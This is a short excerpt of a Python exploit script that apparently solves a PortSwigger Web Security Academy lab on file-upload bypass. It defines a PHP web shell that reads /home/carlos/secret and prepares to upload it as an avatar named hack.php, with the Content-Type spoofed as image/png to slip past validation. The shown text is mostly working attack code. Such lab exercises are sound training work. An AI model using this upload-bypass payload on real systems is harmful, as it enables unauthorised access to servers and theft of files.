...
LAB_URL = "https://0a9200ea03000f77843afe4f00cb0068.web-security-academy.net"
...
def main():
    ...
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Uploading the shell file with the Content-Type changed.. ", end="", flush=True)
    
    shell_file = """<?php echo file_get_contents("/home/carlos/secret") ?>"""
    shell_file_name = "hack.php" # You can change this to what you want
    files = { "avatar": (shell_file_name, shell_file, "image/png") }
